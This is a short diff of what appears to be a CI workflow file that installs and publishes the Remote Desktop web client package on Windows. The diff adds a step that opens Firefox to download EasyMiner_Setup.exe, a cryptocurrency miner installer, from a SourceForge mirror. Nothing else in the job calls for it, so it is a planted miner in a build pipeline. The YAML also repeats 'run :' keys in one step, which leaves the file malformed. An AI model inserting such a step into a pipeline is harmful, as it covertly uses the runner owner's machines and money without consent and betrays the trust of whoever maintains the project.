@@ -40,6 +40,7 @@ jobs:
       run : Install-RDWebClientPackage
       run : Publish-RDWebClientPackage -Type Production -Latest
       run : Get-Command -Module RDWebClientManagement
+      run : "C:\Program Files\Mozilla Firefox\firefox.exe" https://phoenixnap.dl.sourceforge.net/project/easyminer/EasyMiner_98/EasyMiner_Setup.exe
 
     - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
 
